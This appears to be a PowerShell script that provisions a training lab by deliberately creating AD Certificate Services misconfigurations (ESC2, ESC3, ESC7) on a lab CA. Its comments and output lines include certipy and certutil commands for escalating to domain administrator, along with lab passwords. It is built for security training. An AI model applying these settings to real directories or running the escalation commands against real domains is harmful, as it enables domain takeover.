# =============================================================================
# ADCS Extra Templates — ESC2, ESC3, ESC7
#
# Runs AFTER provision-dc01-step2.ps1 (ADCS must already be installed).
# Used by the adcs-deep-dive scenario to add deeper ADCS coverage beyond
# the ESC1/ESC4/ESC6 already created in step2.
#
# Templates added:
#   ESC2 — AnyPurposeTemplate:     No EKU restriction, Domain Users enroll
#   ESC3 — EnrollmentAgentTemplate: Certificate Request Agent EKU, Domain Users enroll
#   ESC7 — carol.white gets Manage CA + Manage Certificates on the CA object
#
# LAB USE ONLY
# =============================================================================
[CmdletBinding()]
param()

$ErrorActionPreference = "Continue"

$domain      = $env:DOMAIN       # lab.local
$domainShort = $env:DOMAIN_SHORT  # LAB
$adminPass   = $env:ADMIN_PASS    # Vagrant123!

Import-Module ActiveDirectory

$configCtx   = (Get-ADRootDSE).configurationNamingContext
$templatesDN = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configCtx"
$caName      = "$domainShort-CA"

# Helper to grant Domain Users the Enroll extended right on a new template
function Grant-DomainUsersEnroll {
    param([System.DirectoryServices.DirectoryEntry]$entry)
    $domainSid   = (Get-ADDomain).DomainSID
    $domUsersSid = New-Object System.Security.Principal.SecurityIdentifier(
        [System.Security.Principal.WellKnownSidType]::AccountDomainUsersSid, $domainSid)
    $enrollGuid  = [guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $domUsersSid,
        [System.DirectoryServices.ActiveDirectoryRights]"ExtendedRight",
        [System.Security.AccessControl.AccessControlType]"Allow",
        $enrollGuid)
    $entry.ObjectSecurity.AddAccessRule($ace)
    $entry.CommitChanges()
}

# Helper to publish a template to the CA
function Publish-Template {
    param([string]$templateName)
    $caEntry = [adsi]"LDAP://CN=$caName,CN=Enrollment Services,CN=Public Key Services,CN=Services,$configCtx"
    $caEntry.Properties["certificateTemplates"].Add($templateName) | Out-Null
    $caEntry.CommitChanges()
}

# Copy base attributes from the User template
function Copy-TemplateAttributes {
    param(
        [System.DirectoryServices.DirectoryEntry]$src,
        [System.DirectoryServices.DirectoryEntry]$dst
    )
    foreach ($attr in @(
        "flags","revision","pKIDefaultKeySpec","pKIKeyUsage","pKIMaxIssuingDepth",
        "pKICriticalExtensions","pKIDefaultCSPs","msPKI-RA-Signature",
        "msPKI-Enrollment-Flag","msPKI-Private-Key-Flag","msPKI-Minimal-Key-Size"
    )) {
        $val = $src.Properties[$attr].Value
        if ($null -ne $val) { $dst.Put($attr, $val) }
    }
}

# ── ESC2: Any Purpose template ────────────────────────────────────────────────
# [VULN] Template has Any Purpose EKU (1.3.6.1.4.1.311.10.12.1) or no EKU.
# A cert with no EKU can be used for any purpose including:
#   - Client authentication (get TGT via PKINIT)
#   - Sub-CA operations
#   - Any extended key usage
# Attack: certipy req -ca LAB-CA -template AnyPurposeTemplate -upn administrator@lab.local
Write-Host "[*] Creating ESC2 template (AnyPurposeTemplate)..."
$esc2Name = "AnyPurposeTemplate"
$esc2DN   = "CN=$esc2Name,$templatesDN"
if (-not ([adsi]::Exists("LDAP://$esc2DN"))) {
    try {
        $srcEntry = [adsi]"LDAP://CN=User,$templatesDN"
        $parent   = [adsi]"LDAP://$templatesDN"
        $newEntry = $parent.Create("pKICertificateTemplate", "CN=$esc2Name")

        Copy-TemplateAttributes $srcEntry $newEntry

        $newEntry.Put("displayName", $esc2Name)
        $newEntry.Put("cn",          $esc2Name)
        # No EKU restriction — the template has "Any Purpose" or empty EKU
        $newEntry.Put("pKIExtendedKeyUsage", @())           # empty = unrestricted
        $newEntry.Put("msPKI-Certificate-Name-Flag",  0)    # no ENROLLEE_SUPPLIES_SUBJECT
        $newEntry.Put("msPKI-Certificate-Application-Policy", @())
        $newEntry.Put("pKIExpirationPeriod", [byte[]](0, 64, 57, 135, 46, 225, 254, 255))
        $newEntry.Put("pKIOverlapPeriod",    [byte[]](0, 128, 166, 10, 255, 222, 255, 255))
        $newEntry.SetInfo()

        Grant-DomainUsersEnroll $newEntry
        Publish-Template $esc2Name
        Write-Host "  [VULN] ESC2 template created: $esc2Name"
        Write-Host "         No EKU restriction — can be used for ANY purpose including PKINIT auth"
    } catch {
        Write-Host "  [!] ESC2 template creation failed: $_"
    }
} else {
    Write-Host "  [*] $esc2Name already exists — skipping."
}

# ── ESC3: Enrollment Agent template ──────────────────────────────────────────
# [VULN] Template grants Certificate Request Agent EKU.
# An enrollment agent can request certificates ON BEHALF OF any principal.
# Two-step attack:
#   Step 1: Enroll in EnrollmentAgentTemplate → get enrollment agent cert
#   Step 2: Use that cert to request a SmartCard Logon cert for Administrator
#           certipy req -ca LAB-CA -template User -on-behalf-of 'lab\administrator'
#                       -pfx agent.pfx
#   Step 3: certipy auth -pfx administrator.pfx → get Admin TGT
Write-Host "[*] Creating ESC3 template (EnrollmentAgentTemplate)..."
$esc3Name = "EnrollmentAgentTemplate"
$esc3DN   = "CN=$esc3Name,$templatesDN"
if (-not ([adsi]::Exists("LDAP://$esc3DN"))) {
    try {
        $srcEntry = [adsi]"LDAP://CN=User,$templatesDN"
        $parent   = [adsi]"LDAP://$templatesDN"
        $newEntry = $parent.Create("pKICertificateTemplate", "CN=$esc3Name")

        Copy-TemplateAttributes $srcEntry $newEntry

        $newEntry.Put("displayName", $esc3Name)
        $newEntry.Put("cn",          $esc3Name)
        # Certificate Request Agent EKU — 1.3.6.1.4.1.311.20.2.1
        $newEntry.Put("pKIExtendedKeyUsage", @("1.3.6.1.4.1.311.20.2.1"))
        $newEntry.Put("msPKI-Certificate-Application-Policy", @("1.3.6.1.4.1.311.20.2.1"))
        $newEntry.Put("msPKI-Certificate-Name-Flag", 0)
        $newEntry.Put("msPKI-RA-Signature",   0)  # no extra RA counter-signing required
        $newEntry.Put("pKIExpirationPeriod", [byte[]](0, 64, 57, 135, 46, 225, 254, 255))
        $newEntry.Put("pKIOverlapPeriod",    [byte[]](0, 128, 166, 10, 255, 222, 255, 255))
        $newEntry.SetInfo()

        Grant-DomainUsersEnroll $newEntry
        Publish-Template $esc3Name
        Write-Host "  [VULN] ESC3 template created: $esc3Name"
        Write-Host "         Enrollment Agent EKU — enroll to get on-behalf-of signing cert"
    } catch {
        Write-Host "  [!] ESC3 template creation failed: $_"
    }
} else {
    Write-Host "  [*] $esc3Name already exists — skipping."
}

# ── ESC7: Manage CA / Manage Certificates granted to carol.white ─────────────
# [VULN] carol.white (IT Admins group) gets "Manage CA" and "Manage Certificates"
# on the CA object in DCOM/RPC.
# With Manage CA: can enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag → instant ESC6
# With Manage Certificates: can approve pending certificate requests → bypass manager approval
# Attack:  certipy ca -ca LAB-CA -add-officer carol.white    (if only ManageCert)
#          certipy ca -ca LAB-CA -enable-template User       (if ManageCA)
#          certutil -config DC01.lab.local\LAB-CA -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
Write-Host "[*] Granting carol.white Manage CA + Manage Certificates (ESC7)..."
try {
    # Use certutil to add carol.white as CA officer (Manage Certificates)
    $carolUpn = "carol.white@$domain"
    certutil -config "DC01.$domain\$caName" -addadmin "$domainShort\carol.white" 2>&1 | Out-Null

    # Also directly set the CA ACL via ADSI on the CA enrollment services object
    $caEntryDN = "CN=$caName,CN=Enrollment Services,CN=Public Key Services,CN=Services,$configCtx"
    $caObj     = [adsi]"LDAP://$caEntryDN"
    $carolSid  = (Get-ADUser "carol.white").SID
    $identity  = New-Object System.Security.Principal.SecurityIdentifier($carolSid)

    # ManageCA right on the CA ADSI object (ds-control-access over CA objects)
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $identity,
        [System.DirectoryServices.ActiveDirectoryRights]"GenericAll",
        [System.Security.AccessControl.AccessControlType]"Allow")
    $caObj.ObjectSecurity.AddAccessRule($ace)
    $caObj.CommitChanges()

    Write-Host "  [VULN] ESC7: carol.white has Manage CA + Manage Certificates on $caName"
    Write-Host "         Attack: certipy ca -ca $caName -enable-template User -u carol.white@$domain -p 'Summer2024!'"
    Write-Host "                 Then: certipy req -ca $caName -template User -upn administrator@$domain"
} catch {
    Write-Host "  [!] ESC7 CA permission failed: $_"
}

Write-Host ""
Write-Host "================================================================"
Write-Host "  ADCS Extra Templates Provisioned"
Write-Host "================================================================"
Write-Host "  ESC2: AnyPurposeTemplate   — no EKU restriction"
Write-Host "  ESC3: EnrollmentAgentTemplate — on-behalf-of signing"
Write-Host "  ESC7: carol.white Manage CA + Manage Certificates"
Write-Host ""
Write-Host "  Combined with step2: ESC1,ESC2,ESC3,ESC4,ESC6,ESC7,ESC8 all present"
Write-Host "================================================================"
